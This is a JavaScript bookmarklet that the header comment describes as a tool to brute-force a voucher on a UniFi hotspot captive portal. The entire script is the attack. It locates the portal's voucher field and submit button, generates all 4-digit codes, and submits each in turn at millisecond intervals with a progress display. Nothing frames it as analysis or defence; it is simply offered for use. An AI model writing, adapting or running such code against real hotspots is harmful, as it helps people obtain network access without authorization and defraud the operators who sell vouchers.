javascript:/* Brute-Force a vouncher on a UniFi hotspot ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- */(


function() {
    var digits = 4;

    var toast_container_query = document.getElementsByClassName('unifiPortalToastContainer ng-scope');
    var box_query = document.getElementsByClassName('unifiPortalBox ng-scope ng-isolate-scope');
    var header_query = document.getElementsByClassName('unifiPortalBox__header ng-binding');
    var input_query = document.getElementsByName('voucherCode');
    var submit_query = document.getElementsByClassName('ng-binding ng-scope');
    var box; var header; var under_header; var input; var submit;

    if (toast_container_query.length == 1 && box_query.length == 1 && header_query.length == 1 && input_query.length == 1 && submit_query.length == 1) {
        to = box_query[0];
        box = box_query[0];
        header = header_query[0];
        input = input_query[0];
        submit = submit_query[0];

        toast_container_query[0].remove();

        under_header = document.createElement('div');
        under_header.innerHTML = "Starting...";

        box.insertBefore(under_header, box.children[1]);

        header.innerHTML = `Loggin in...\t${1}%`;

        var vouchers = [];
        var max = parseInt("9".repeat(digits)) +1;

        for (let i = 0; i < max; i++) {
            vouchers.push("0".repeat(digits - i.toString().length) + i.toString());
        }

        var index = 0;
        function doChunk() {
            header.innerHTML = `Loggin in...\t${Math.round(index/max*100).toString()}%`;
            under_header.innerHTML = `Attempting voucher: ${vouchers[index]}`;

            input.value = vouchers[index];
            submit.click();

            ++index;

            if (index < vouchers.length) {
                setTimeout(doChunk, 1);
            }
        }    
        doChunk();
    } else {
        alert('Invalid Website!');
    }
}


)();